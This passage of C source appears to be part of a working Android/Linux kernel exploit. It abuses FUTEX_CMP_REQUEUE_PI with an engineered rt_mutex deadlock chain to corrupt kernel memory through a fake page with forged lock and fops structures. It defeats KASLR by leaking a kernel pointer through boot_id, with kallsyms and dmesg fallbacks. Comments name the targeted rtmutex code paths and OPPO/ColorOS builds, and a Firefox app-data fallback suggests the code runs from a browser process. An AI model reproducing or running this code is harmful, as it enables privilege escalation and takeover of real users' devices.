  int futex_ret = futex_op(&h1a_d_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                           &timeout, &h1a_d_f_pi_target, 0);
  pr_info("H1A-D waiter futex_requeue_pi ret=%d errno=%d\n",
          futex_ret, errno);

  if (atomic_load(&h1a_d_punch_allowed)) {
    slide_h1a_pselect_punch();
  } else {
    pr_warning("H1A-D waiter punch skipped (requeue gate not passed)\n");
  }
  atomic_store(&h1a_d_route_done, 1);
  futex_op(&h1a_d_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&h1a_d_owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

static void *h1a_d_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (futex_op(&h1a_d_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A-D owner lock target errno=%d\n", errno);
    atomic_store(&h1a_d_owner_chain_done, 1);
    atomic_store(&h1a_d_owner_stop, 1);
    return NULL;
  }
  while (!atomic_load(&h1a_d_waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&h1a_d_owner_started, 1);
  /* Proven deadlock shaping: the uaddr2 futex stays owned by this
   * thread, and here we block on the chain futex held by the victim.
   * During FUTEX_CMP_REQUEUE_PI the proxy enqueues the victim's
   * rt_waiter onto the uaddr2 rt_mutex (owner == this thread), then
   * task_blocks_on_rt_mutex() runs the FULL_CHAINWALK because this
   * owner is itself blocked (rtmutex.c:1002-1022); the chain reaches
   * the chain futex owned by the victim and returns -EDEADLK. Doing
   * this before enqueue would hit the early `owner == task` return
   * (rtmutex.c:951) and remove_waiter() would dequeue a node that was
   * never enqueued, so do NOT write victim_tid|FUTEX_WAITERS here. */
  if (futex_op(&h1a_d_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A-D owner lock chain errno=%d\n", errno);
    atomic_store(&h1a_d_owner_chain_done, 1);
    atomic_store(&h1a_d_owner_stop, 1);
    return NULL;
  }
  while (!atomic_load(&h1a_d_owner_stop)) {
    sleep(1);
  }
  futex_op(&h1a_d_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  futex_op(&h1a_d_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&h1a_d_owner_chain_done, 1);
  return NULL;
}

int slide_h1a_d_test(void) {
  pid_t watchdog_pid = -1;
  int watchdog_pipe = -1;
  int result = 2;

  pr_info("H1A-D route: deadlock-shaped requeue probe, one attempt, "
          "fail-closed gate\n");
  h1a_d_f_wait = 0;
  h1a_d_f_pi_target = 0;
  h1a_d_f_pi_chain = 0;
  atomic_store(&h1a_d_waiter_ready, 0);
  atomic_store(&h1a_d_waiter_waiting, 0);
  atomic_store(&h1a_d_owner_started, 0);
  atomic_store(&h1a_d_owner_chain_done, 0);
  atomic_store(&h1a_d_owner_stop, 0);
  atomic_store(&h1a_d_route_done, 0);
  atomic_store(&h1a_d_waiter_tid, 0);
  atomic_store(&h1a_d_punch_allowed, 0);
  atomic_store(&h1a_d_requeue_ret, 0);
  atomic_store(&h1a_d_requeue_errno, 0);
  atomic_store(&h1a_waiter_tid, 0);
  atomic_store(&h1a_punch_go, 0);
  atomic_store(&h1a_punch_stop, 0);
  atomic_store(&h1a_punch_calls, 0);
  atomic_store(&h1a_punch_success, 0);
  atomic_store(&h1a_punch_inflight, 0);
  atomic_store(&h1a_punch_last_ret, -1);
  atomic_store(&h1a_punch_last_errno, 0);

  watchdog_pid = slide_h1a_start_watchdog(&watchdog_pipe);
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, h1a_d_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, h1a_d_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_h1a_consumer_thread, NULL));

  while (!atomic_load(&h1a_d_waiter_waiting) ||
         !atomic_load(&h1a_d_owner_started)) {
    usleep(1000);
  }
  /* Give the owner time to actually block on the chain futex so the
   * requeue chainwalk sees the victim -> owner -> victim cycle. */
  usleep(100000);
  errno = 0;
  int requeue_ret = futex_op(&h1a_d_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                             (void *)1, &h1a_d_f_pi_target, 0);
  int requeue_errno = errno;
  atomic_store(&h1a_d_requeue_ret, requeue_ret);
  atomic_store(&h1a_d_requeue_errno, requeue_errno);
  pr_info("H1A-D requeue ret=%d errno=%d (expected ret=-1 errno=EDEADLK)\n",
          requeue_ret, requeue_errno);

  if (requeue_ret < 0 && requeue_errno == EDEADLK) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (page_base && fake_lock && fake_w0) {
      pr_info("H1A-D page prepared base=%016zx lock=%016zx w0=%016zx "
              "fops=%016zx\n",
              page_base, fake_lock, fake_w0, fake_fops);
      atomic_store(&h1a_d_punch_allowed, 1);
      result = 0;
    } else {
      pr_error("H1A-D fail step=page-prepare\n");
      result = 2;
    }
  } else {
    pr_error("H1A-D requeue signature mismatch, skipping page preparation "
             "and punch (fail-closed)\n");
    result = 3;
  }

  while (!atomic_load(&h1a_d_route_done)) {
    usleep(10000);
  }
  atomic_store(&h1a_d_owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  slide_h1a_finish_watchdog(watchdog_pid, watchdog_pipe);

  if (atomic_load(&h1a_d_punch_allowed)) {
    ks_leak_diff_dump();
    result = (atomic_load(&h1a_punch_calls) == 1 &&
              atomic_load(&h1a_punch_success) == 1) ? 0 : 3;
  }
  pr_info("H1A-D %s requeue_ret=%d requeue_errno=%d calls=%d success=%d\n",
          result == 0 ? "success" : "fail",
          atomic_load(&h1a_d_requeue_ret),
          atomic_load(&h1a_d_requeue_errno),
          atomic_load(&h1a_punch_calls),
          atomic_load(&h1a_punch_success));
  return result;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  if (!stext || stext < 0xffffff8000000000ULL || (stext & 0xffff) != 0) {
    pr_warning("slide implausible boot_id-derived_stext pid=%d "
               "leaked=%016llx off=%016llx stext=%016llx\n",
               getpid(), (unsigned long long)leaked,
               (unsigned long long)off, (unsigned long long)stext);
    return 0;
  }
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  /* 1MB stacks: a layout-mismatch kernel write must not reach the canary */
  pthread_attr_t big_stack;
  pthread_attr_init(&big_stack);
  pthread_attr_setstacksize(&big_stack, 1u << 20);
  SYSCHK(pthread_create(&waiter, &big_stack, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, &big_stack, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, &big_stack, slide_consumer_thread, NULL));
  pr_info("slide child threads up\n");

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  int requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);
  pr_info("slide child requeue issued ret=%d errno=%d\n",
          requeue_ret, errno);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_stop, 1);
  atomic_store(&slide_owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  pr_info("slide child route done, reading stext\n");

  /* Read back the SKB data: if the PI chain walk modified the prio field
   * (waiter->prio = task->prio), we can read the leaked 32-bit value. */
  uint32_t leaked_prio = ks_leak_readback();
  if (leaked_prio) {
    pr_success("KS_LEAK_VALUE 0x%08x\n", leaked_prio);
  }

  return slide_read_stext();
}

/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
 * are not restricted - common on OPPO/ColorOS debug builds) */
static int slide_leak_from_kallsyms(void) {
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  uint64_t text = 0;
  while (fgets(line, sizeof(line), f)) {
    unsigned long long addr = 0;
    char type = 0;
    char name[128] = {0};
    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
        strcmp(name, "_text") == 0) {
      text = (uint64_t)addr;
      break;
    }
  }
  fclose(f);
  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
    kaslr_base = text;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }
  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
  return 0;
}

/* round-3: dmesg "Kernel Offset" fallback */
static int slide_leak_from_dmesg(void) {
  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
  if (!f) {
    return 0;
  }
  char line[256];
  int got = 0;
  unsigned long long off = 0;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
      got = 1;
      break;
    }
  }
  pclose(f);
  if (!got) {
    pr_warning("slide: dmesg Kernel Offset unavailable\n");
    return 0;
  }
  kaslr_base = KIMAGE_TEXT_BASE + off;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
             getpid(), off, (unsigned long long)kaslr_base);
  return 1;
}

static void slide_guard_path(char *path, size_t size) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = getenv("HOME");
  if (!home || !home[0]) home = "/data/local/tmp";
  /* Untrusted-app context cannot create files in /data/local/tmp; the
   * guard must be creatable, so fall back to the app's own data dir. */
  if (!strncmp(home, "/data/local/tmp", 15) && access("/data/local/tmp", W_OK) != 0)
    home = "/data/data/org.mozilla.firefox/files";
  snprintf(path, size, "%s/.ghostlock-slide-pselect.lock", home);
}

static int slide_guard_active(void) {
  char path[320];
  struct stat st;
  slide_guard_path(path, sizeof(path));
  return stat(path, &st) == 0;
}

static void slide_guard_arm(int attempt) {
  char path[320];
  slide_guard_path(path, sizeof(path));
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_warning("slide guard arm failed path=%s errno=%d\n", path, errno);
    return;
  }

  char text[128];
  int n = snprintf(text, sizeof(text),
                   "slide attempt=%d pid=%d\n", attempt, getpid());
  if (n > 0) {
    ssize_t ignored = write(fd, text, (size_t)n);
    (void)ignored;
  }
  close(fd);
}

static void slide_guard_disarm(void) {
  char path[320];
  slide_guard_path(path, sizeof(path));
  unlink(path);
}

int slide_leak_kernel_base(void) {
  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
    return 1;
  }
  if (slide_guard_active()) {
    pr_error("slide guard active: previous route died or panicked; "
             "remove the guard file to retry manually\n");
    return 0;
  }
#ifdef CFGOPS_4_19_STYLE
  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
             (unsigned long long)SLIDE_LOGGERS_0_1,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
#endif
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    slide_guard_arm(attempt);
    if (!slide_guard_active()) {
      close(fds[0]);
      close(fds[1]);
      pr_error("slide guard not armed; refusing unsafe route retry\n");
      return 0;
    }
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (WIFEXITED(status)) {
      slide_guard_disarm();
    } else {
      pr_error("slide child died abnormally status=%d; guard kept\n", status);
      return 0;
    }
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
